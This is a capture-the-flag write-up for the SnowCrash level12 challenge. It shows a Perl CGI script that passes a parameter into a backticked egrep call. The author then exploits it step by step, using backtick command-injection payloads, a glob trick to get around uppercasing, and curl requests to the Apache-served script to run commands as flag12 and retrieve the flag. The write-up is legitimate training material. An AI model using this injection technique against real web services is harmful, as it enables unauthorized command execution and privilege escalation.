## level12

We got ourselves another Perl script:

```bash
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param}; # import param function
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # second argument passed to the subroutine
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; # convert to uppercase
  $xx =~ s/\s.*//; # discards everything following the first space
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # the symbol @ stands for array
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

So the script grabs the `x` parameter, makes it uppercase and trims off everything following the first space. The subroutine `n` will inform us with `..` or `.` if the parameters were listed in a file in `/tmp` folder. It turns out that this is just noise: what we want is to execute code as `flag12` when it calls `egrep`.

A quick check on the Apache configuration shows that the script is indeed called on the port `4646`

```bash
level12@SnowCrash:~$ cat /etc/apache2/sites-enabled/level12.conf
<VirtualHost *:4646>
	DocumentRoot	/var/www/level12/
	SuexecUserGroup flag12 level12
	<Directory /var/www/level12>
		Options +ExecCGI
		DirectoryIndex level12.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

Yet again the subtlety is at what point (and therefore with which user) a command is executed. Check this out:

```bash
level12@SnowCrash:~$ echo "whoami > /tmp/me" > /tmp/whoami
level12@SnowCrash:~$ chmod 777 /tmp/whoami
level12@SnowCrash:~$ ./level12.pl x="`/tmp/whoami`"
Content-type: text/html

..level12@SnowCrash:~cat /tmp/me
level12
```

I’m making a script that calls `whoami` and redirects the output to `/tmp/me`. I know that the script is going to uppercase the parameter but… the script just worked.

Why? Because the expression in backticks ```` was evaluated ***before***. If I make sure that the argument is passed as it is...

```bash
level12@SnowCrash:~$ ./level12.pl x='`/tmp/whoami`' # added single quotes
Content-type: text/html

sh: 1: /TMP/WHOAMI: not found
```

From the error message I see that now it is indeed looking for the uppercase version!

I can easily capitalize my script, but what about about the directory? I can’t write in any but `/tmp`, I can’t create a capitalized directory in the root. Luckily, `*` will expand to any directory containing what follows, so `/*/WHOAMI` will expand to `/tmp/whoami`.

```bash
level12@SnowCrash:~$ cp /tmp/whoami /tmp/WHOAMI
level12@SnowCrash:~$ ./level12.pl x='`/*/WHOAMI`'
Content-type: text/html

..level12@SnowCrash:~cat /tmp/me
level12
```

Still not the user we wanted… but the script was called.

Let’s now talk to it through Apache, since the config says `SuexecUserGroup flag12 level12` so it’s definitely be ran as `flag12`.

```bash
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/WHOAMI`'
..level12@SnowCrash:~cat /tmp/me
flag12
```

I guess it’s time to ask the right question then…

```bash
# Creating capitalized script and opening permissions
level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/GETFLAG
level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
# Running it as level12 to check that it works
level12@SnowCrash:~$ /tmp/GETFLAG
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)

# Running through the script served by Apache
# Calling getflag and not GETFLAG to show that it gets indeed capitalized
# The script is /tmp/GETFLAG
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/getflag`'
..level12@SnowCrash:~$at /tmp/flag`'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```